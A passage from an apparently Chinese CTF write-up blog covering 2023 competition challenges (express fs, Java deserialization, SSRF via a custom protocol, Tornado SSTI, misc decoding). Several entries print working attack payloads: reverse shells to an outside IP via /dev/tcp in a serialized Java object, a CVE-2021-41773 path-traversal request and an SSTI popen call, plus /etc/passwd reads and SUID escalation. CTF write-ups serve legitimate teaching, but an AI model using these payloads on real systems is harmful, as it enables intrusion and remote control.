</span><br><span class="hljs-string">         哎，对了。拿走之前看一看我精心挑选的笑话吧：猎人打猎，朝狐狸开枪，“砰”地一声枪响之后猎人死了。狐狸叉着腰，冷笑一声：</span><br><span class="hljs-string">“没想到吧，我是反射弧。”好不好笑， 有没有感觉一哆嗦，大脑更清晰了。ฅ՞•ﻌ•՞ ต&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> heigth_list:<br>    ten_chr += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-number">8</span>))  <span class="hljs-comment">#8转10转ascii</span><br><span class="hljs-comment">#print(heigth_list)</span><br><span class="hljs-built_in">print</span>(ten_chr)<br><br>data = ten_chr.split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-comment">#print(data)</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(data[i]))<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#JRFTC5SFG5SU4STVHBTTCR2SKVSE2NKVIUYFCS2MOVFUWMLLGVKWITKLJZSE2NKVMRFUWY3EJU3VKZCNGVKU2SKQMNXE2WCVMRGTKVKNMM2XMRKLGE2US5SEOFWTMRDRNZVTO5LNGZCGYWDVOVYUG5KYKVWTMRDRMRBG4ZDNGZJE4TLWIRYWITJVOVWTMUSOMRGXK4LONM2VK3JWIRWGITJVMRWTMUSVJV3FEVLEJU2XKZCCNZKWITJVJZSE2NKVNZVTOVLEJU2VCWDVGVKUKTLEOFWTMRDMMRGTKVKYOU3XIRJWKJKGITJVKVSGEODQNJ2UWWCLGB2WWTDCOU3EWQRQJRCXKWDFMRBDINLJGVXEUSRPMFEUW5TYOFFEEWCTORGVQSBRNNJHKS2HKRDXIVSSOVEXE5JWNJGWCWCLIJIXATBXNZVUYQRROVIVMMDNORFWKR2JOJFU2S2JGBLEKTKQOFGU4UKGJN2FEUCNKY2EQQKOKVFU2TJVLBXESS3NMQXVMNZZKY2UQTJPMVSU2S2RINUXKMLVKFCW64KLJMZXO2JVJNEGI6JQO5GDKVJWOQ3TAMSLJVFFU2SNGAYW4Y2YMFGWWUSINJ2WY53EGA4WYTJWHB4GSZ2LJI4WENDWJQ3TKTBTG5LE45DHJNSUULZVOBFFMMJSJN2U2NSRM4YTSOKWMEZEYN3BOQ4UKZLDNFGVQ4SNJNIUUOJXNZ3FC23OOJFXONLZKFETQMTOI43VGSKNKBKTCVSQINUWENCLGFDWCYTJJU2GISLHGR3TG4SRIMZUES2YNZDTAMDUJUYEKTJQGV4ES6JRNVFWGMCUJI3XKN2NKZ4E45CHGB2DGYTBKFMHS33XIVHGK6KFO4YTCQ2CGRZG4VSYIFIWE6DXINZEW4BTI5QUC2LSG5LESVTOIF2E4YKTGM3TIVCKMIYTE3KHJMXXIY3PI52EK3TVNFZEWYKNO5LGW2SCKZYEK5ZUNQZXKODXLBCW4MJRKZFVAZCLKM3DSYRYKBXE4NCIJJVTE4KFKZITA2KJMR3UWQRUMFUWENDWJJHFCNDNNNJFGMZXMEXXIYTBKBIU2ZJPJIXVCSKYOI2HU5DHKM3USRJZOFGS642OGFDVQU3JGAYUW2TXGRAUS5KEKBXE2222JRTTG4BRIU2TMOKNGJ3UCTRVIZVESWCNNZRUWVSLJU2EM5COJM3VC5ZRMRXDA3ZXNFCTKWCKJZIWMMLDGREWUQTPJZUXSMBXNFTVQSCLIIZVI2TCNRIEK22LGZEWEUTMJU2WCZJZJV4FU2SJMVDFQVRXGFFGWUBYJJZG46CYGUYHSWBPGU4EWYRQJFVGEMLLNVVTS4KNOQ4DKSSHLAYDGRJVNBFUSNKFNZHDI2CFOU3U2M2NMFWUGSKSMFMGWN2WGM3TAOBTF42EEZDCHFWFQTLMOAZUWVJUNFBDSTSLMNJXATBWKI3FQYZRGZXGWODCGNDTSNZRKZJDQZCNGVKWITJVGVVHKMKNJQ3VCN2NJE3WGZBWONXTC4RVNM4UKYLBNJETKLZRORJFU2TCGNMTSYRVO4YUKOLL</span><br></code></pre></td></tr></table></figure><p>base32-&gt;base64换表-&gt;base64</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493423.png" alt="img"></p><p>拿到一张rgb很混乱的图片，Piet隐写</p><p>用工具npiet</p><p>下载：<a href="https://www.bertnase.de/npiet/">https://www.bertnase.de/npiet/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">npiet.exe -tpic download.png <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023柏鹭杯</title>
    <link href="/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <url>/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023柏鹭杯"><a href="#2023柏鹭杯" class="headerlink" title="2023柏鹭杯"></a>2023柏鹭杯</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="express-fs"><a href="#express-fs" class="headerlink" title="express fs"></a>express fs</h2><p>参考：<a href="https://www.cnblogs.com/91ac0m0/p/17557039.html">https://www.cnblogs.com/91ac0m0/p/17557039.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">?file[protocol]=file:&amp;file[href]=a&amp;file[pathname]=fl%2561g.txt&amp;file[hostname]=&amp;file[origin]=x<br></code></pre></td></tr></table></figure><h2 id="综合题5"><a href="#综合题5" class="headerlink" title="综合题5"></a>综合题5</h2><p>源码中有<code>/readfile?filename=</code></p><p>目录穿越读文件<code>/../../../../../app/demo.jar</code></p><p>拿到源码</p><p>Upload.class，upload类中有混淆加密的flag1</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252215.png" alt="img"></p><p>逆向一下得到flag1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReverseUpload</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">O0O</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6925cc02789c1d2552b71acc4a2d48fd&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ReverseUpload</span> <span class="hljs-variable">uploader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReverseUpload</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalEncFlag1</span> <span class="hljs-operator">=</span> uploader.decryptEncFlag1();<br>        System.out.println(<span class="hljs-string">&quot;Original enc_flag1: &quot;</span> + originalEncFlag1);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">decryptEncFlag1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64EncodedFlag1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(base64EncodedFlag1);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">decodedString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decodedBytes);<br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">decryptedFlag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; decodedString.length(); i++) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">originalChar</span> <span class="hljs-operator">=</span> decodedString.charAt(i);<br>            <span class="hljs-type">char</span> <span class="hljs-variable">oOO</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.O0O.charAt(i % <span class="hljs-built_in">this</span>.O0O.length());<br>            <span class="hljs-type">char</span> <span class="hljs-variable">encryptedChar</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>) (originalChar ^ oOO);<br>            decryptedFlag.append(encryptedChar);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> decryptedFlag.toString();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//Original enc_flag1: flag&#123;ISEC-52e353a950c752b3dc8f0d1c949f0361&#125;</span><br></code></pre></td></tr></table></figure><h2 id="综合题6"><a href="#综合题6" class="headerlink" title="综合题6"></a><strong>综合题</strong>6</h2><p>源码中Ping.class是一个恶意类，readObject反序列化，exec可以命令执行</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252171.png" alt="img"></p><p>通过Upload类的<code>/internalApi/v3.2/updateConfig</code>此路由可以反序列化加载恶意类Ping进行命令执行</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252172.png" alt="img"></p><p>Ser.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// Create a Ping object</span><br>        <span class="hljs-type">Ping</span> <span class="hljs-variable">ping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ping</span>();<br>        ping.setCommand(<span class="hljs-string">&quot;bash&quot;</span>);<br>        ping.setArg1(<span class="hljs-string">&quot;-c&quot;</span>);<br>        ping.setArg2(<span class="hljs-string">&quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEyLjI1MS42Mi80NTY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span>);<br><br>        <span class="hljs-comment">// Serialize the Ping object to a byte array</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(ping);<br><br>        <span class="hljs-comment">// Encode the byte array to Base64</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));<br>        System.out.println(<span class="hljs-string">&quot;Payload: &quot;</span> + payload);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Payload: rO0ABXNyABVjb20uZXhhbXBsZS5kZW1vLlBpbmcAAAAAAAAAAQIAA0wABGFyZzF0ABJMamF2YS9sYW5nL1N0cmluZztMAARhcmcycQB+AAFMAAdjb21tYW5kcQB+AAF4cHQAAi1jdABfYmFzaCAtYyAne2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eExqRXlMakkxTVM0Mk1pODBOVFkzSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfSd0AARiYXNo</span><br></code></pre></td></tr></table></figure><p>反弹shell</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252183.png" alt="img"></p><p>find找suid，dig提权，<code>/usr/bin/dig -f /root/flag2</code></p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252184.png" alt="img"></p><h2 id="综合题7"><a href="#综合题7" class="headerlink" title="综合题7"></a>综合题7</h2><p>这题当时差一点时间没打出来，当时上传了msf马到服务器上搭好了隧道redis写了ssh的公钥</p><p>赛后看了很多师傅的wp，都是用frp代理进去，写公钥后连上去即可</p><p>具体参考</p><p><a href="http://blog.xmcve.com/2023/10/13/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023-Writeup/#title-4">星盟</a><br><a href="https://www.cnblogs.com/V3g3t4ble/p/17757854.html">V3g3t4ble</a><br><a href="https://fushuling.com/index.php/2023/10/12/2023%e7%bd%91%e4%bf%a1%e6%9f%8f%e9%b9%ad%e6%9d%af%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e5%ae%89%e5%85%a8%e7%b2%be%e8%8b%b1%e8%b5%9b/">fushulingのblog</a></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>每一行的空格数量为flag的ascii，转一下得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">x = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;qd.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    aa = f.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> aa:<br>        x += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(i)-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">#flag&#123;ISEC-eF8x2Bv1viw9eFvagivx0Ynv3jlai0vL&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF 2nd</title>
    <link href="/2023/09/18/NSSCTF%202nd/"/>
    <url>/2023/09/18/NSSCTF%202nd/</url>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF-2nd"><a href="#NSSCTF-2nd" class="headerlink" title="NSSCTF 2nd"></a>NSSCTF 2nd</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="MyBox-revenge"><a href="#MyBox-revenge" class="headerlink" title="MyBox(revenge)"></a>MyBox(revenge)</h2><p>给了一个url的参数，可以利用file读文件</p><p><code>?url=file:///etc/passwd</code></p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210687199.png)</p><p>ban了<code>/proc/1/environ</code>，<code>/start.sh</code>等非预期</p><p>读<code>/app/app.py</code>拿到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs Plain">from flask import Flask, request, redirect<br>import requests, socket, struct<br>from urllib import parse<br>app = Flask(__name__)<br><br>@app.route(&#x27;/&#x27;)<br>def index():<br>    if not request.args.get(&#x27;url&#x27;):<br>        return redirect(&#x27;/?url=dosth&#x27;)<br>    url = request.args.get(&#x27;url&#x27;)<br>    if url.startswith(&#x27;file://&#x27;):<br>        if &#x27;proc&#x27; in url or &#x27;flag&#x27; in url:<br>            return &#x27;no!&#x27;<br>        with open(url[7:], &#x27;r&#x27;) as f:<br>            data = f.read()<br>            if url[7:] == &#x27;/app/app.py&#x27;:<br>                return data<br>            if &#x27;NSSCTF&#x27; in data:<br>                return &#x27;no!&#x27;<br>            return data<br>    elif url.startswith(&#x27;http://localhost/&#x27;):<br>        return requests.get(url).text<br>    elif url.startswith(&#x27;mybox://127.0.0.1:&#x27;):<br>        port, cont    ent = url[18:].split(&#x27;/_&#x27;, maxsplit=1)<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.settimeout(5)<br>        s.connect((&#x27;127.0.0.1&#x27;, int(port)))<br>        s.send(parse.unquote(content).encode())<br>        res = b&#x27;&#x27;<br>        while 1:<br>            data = s.recv(1024)<br>            if data:<br>                res += data<br>            else:<br>                break<br>        return res<br>    return &#x27;&#x27;<br><br>app.run(&#x27;0.0.0.0&#x27;, 827)<br></code></pre></td></tr></table></figure><p>重点看23行<code>elif url.startswith(&#39;mybox://127.0.0.1:&#39;):</code>，建立了一个到127.0.0.1上的指定端口（827）的TCP的socket通信</p><p>相当于一个gopher协议的替换，即把gopher:&#x2F;&#x2F;127.0.0.1改成mybox:&#x2F;&#x2F;127.0.01</p><p>然后目的很明显了，gopher打ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> urllib.parse<br>test =<span class="hljs-string">&quot;&quot;&quot;GET /flag HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;mybox://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-comment">#注意两次url编码</span><br><span class="hljs-built_in">print</span>(urllib.parse.quote(result))<br></code></pre></td></tr></table></figure><p>以为flag在当前目录，回显404，但是这里有一个关键，Apache版本为2.4.49，以前复现过的CVE-2021-41773，可以目录穿越</p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686831.png)</p><p>CVE-2021-41773的payload:<code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> urllib.parse<br>test =<span class="hljs-string">&quot;&quot;&quot;GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 51</span><br><span class="hljs-string"></span><br><span class="hljs-string">bash -c &quot;bash -i &amp;&gt; /dev/tcp/1.12.251.62/4567 0&gt;&amp;1&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;mybox://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(urllib.parse.quote(result))<br><span class="hljs-comment">#mybox%3A//127.0.0.1%3A80/_GET%2520/cgi-bin/.%25252e/.%25252e/.%25252e/.%25252e/.%25252e/bin/sh%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252051%250D%250A%250D%250Abash%2520-c%2520%2522bash%2520-i%2520%2526%253E%2520/dev/tcp/1.12.251.62/4567%25200%253E%25261%2522%250D%250A</span><br></code></pre></td></tr></table></figure><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686832.png)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">daemon@d22eb7fdd4144138:/<span class="hljs-built_in">bin</span>$ cat /nevvvvvver_f1nd_m3_the_t3ue_flag<br><br>NSSCTF&#123;dfaa40bc-dab6-433a-a970-ec0e3b5ba084&#125;<br></code></pre></td></tr></table></figure><h2 id="MyHurricane"><a href="#MyHurricane" class="headerlink" title="MyHurricane"></a>MyHurricane</h2><p>参考<a href="https://blog.csdn.net/miuzzx/article/details/123329244">https://blog.csdn.net/miuzzx/article/details/123329244</a></p><p>开局源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> tornado.ioloop<br><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">import</span> os<br><br>BASE_DIR = os.path.dirname(__file__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">data</span>):<br>    bl = [<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;not&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> bl:<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> data.split():<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chunk:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-number">31</span> &lt; <span class="hljs-built_in">ord</span>(c) &lt; <span class="hljs-number">128</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexHandler</span>(tornado.web.RequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            self.finish(f.read())<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self</span>):<br>        data = self.get_argument(<span class="hljs-string">&quot;ssti&quot;</span>)<br>        <span class="hljs-keyword">if</span> waf(data):<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-string">f&quot;&quot;&quot;&lt;html&gt;</span><br><span class="hljs-string">                        &lt;head&gt;&lt;/head&gt;</span><br><span class="hljs-string">                        &lt;body style=&quot;font-size: 30px;&quot;&gt;<span class="hljs-subst">&#123;data&#125;</span>&lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-string">                        &quot;&quot;&quot;</span>)<br>                f.flush()<br>            self.render(<span class="hljs-string">&#x27;1.html&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            self.finish(<span class="hljs-string">&#x27;no no no&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app = tornado.web.Application([<br>            (<span class="hljs-string">r&quot;/&quot;</span>, IndexHandler),<br>        ], compiled_template_cache=<span class="hljs-literal">False</span>)<br>    app.listen(<span class="hljs-number">827</span>)<br>    tornado.ioloop.IOLoop.current().start()<br></code></pre></td></tr></table></figure><p>tornado ssti，过滤了<code>[&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;__&#39;, &#39;(&#39;, &#39;)&#39;, &#39;or&#39;, &#39;and&#39;, &#39;not&#39;, &#39;&#123;&#123;', '&#125;&#125;&#39;]</code></p><p>过滤了<code>&#123;&#123;&#125;&#125;</code>用<code>&#123;%%&#125;</code>代替</p><p>过滤了and和or其实就是不能用<code>handler</code>和<code>import</code></p><p>这里利用了<code>_tt_utf8</code>进行变量覆盖，<code>set _tt_utf8=eval</code></p><p>原理</p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686833.png)</p><p>过滤了单引号和双引号，可能要加另一个变量替换（即$a($b)&amp;$b&#x3D;””），这里利用<code>request.body_arguments[request.method]</code>，返回的变量名为<code>GET</code>、<code>POST</code>…</p><p>最后payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">ssti=&#123;% raw request.body_arguments[request.method][<span class="hljs-number">0</span>]%0a    _tt_utf8 = <span class="hljs-built_in">eval</span>%&#125;&amp;POST=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/1.12.251.62/4567 &lt;%261&#x27;&quot;</span>)<br>ssti=&#123;% <span class="hljs-built_in">set</span> 